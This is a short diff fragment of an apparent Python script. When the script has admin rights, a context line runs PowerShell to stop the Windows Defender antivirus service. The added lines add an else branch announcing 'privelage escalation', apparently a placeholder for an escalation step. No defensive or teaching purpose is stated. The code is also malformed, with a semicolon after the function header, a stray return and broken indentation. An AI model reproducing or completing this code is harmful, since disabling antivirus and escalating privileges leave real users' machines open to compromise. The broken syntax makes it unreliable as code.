@@ -7,3 +7,6 @@ def go();
    return is_admin
   if is_admin:
     subprocess.call("powershell -c sc stop WinDefend", shell=True)
+  else:
+    print("Running privelage escalation")
+      
